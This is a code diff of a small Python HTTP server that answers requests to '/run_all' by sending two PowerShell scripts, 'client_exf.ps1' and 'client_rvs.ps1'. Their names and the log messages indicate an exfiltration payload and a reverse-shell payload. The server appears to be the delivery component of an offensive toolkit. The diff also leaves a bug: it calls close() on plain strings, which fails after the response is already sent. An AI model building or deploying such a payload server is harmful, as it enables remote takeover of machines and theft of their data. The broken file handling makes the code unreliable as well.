@@ -20,16 +20,15 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         if self.path == '/run_all':
             try:
                 file_to_open = open('client_exf.ps1','r').read()
+                file_to_open2 = open('client_rvs.ps1','r').read()
                 self.send_response(200)
                 self.send_header('Content-type', 'text')
                 self.end_headers()
-                self.wfile.write(bytes(file_to_open, 'utf-8'))
+                self.wfile.write(bytes(file_to_open, 'utf-8')+bytes(file_to_open2, 'utf-8'))
                 log('[+] File client_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
-                file_to_open.close()
-                file_to_open = open('client_rvs.ps1','r').read()
-                self.wfile.write(bytes(file_to_open, 'utf-8'))
                 log('[+] File client_rvs.ps1 has been requested and was sent!',print_console=True,trace_time=True)
                 file_to_open.close()
+                file_to_open2.close()
             except:
                 log('[-] Error while sending both files.',print_console=True,trace_time=True)
                 self.send_response(404)
